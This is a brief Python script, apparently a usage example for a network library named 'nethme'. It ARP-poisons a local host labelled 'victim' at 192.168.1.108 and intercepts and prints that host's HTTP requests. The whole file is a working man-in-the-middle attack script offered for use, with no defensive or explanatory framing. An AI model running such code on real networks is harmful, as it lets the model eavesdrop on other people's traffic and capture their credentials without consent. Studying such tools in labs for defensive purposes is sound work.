from nethme import *

def http_handler(device, http_request):
    print("Got packet from:", device)
    http_request.show()


def main():
    net = Network(iface='en0')
    victim = net.get_device(ip='192.168.1.108')

    victim.poison_arp() # with no arguments poison the gateway IP with this.device MAC address
    victim.intercept('http_request', http_handler)


if __name__ == '__main__':
    main()
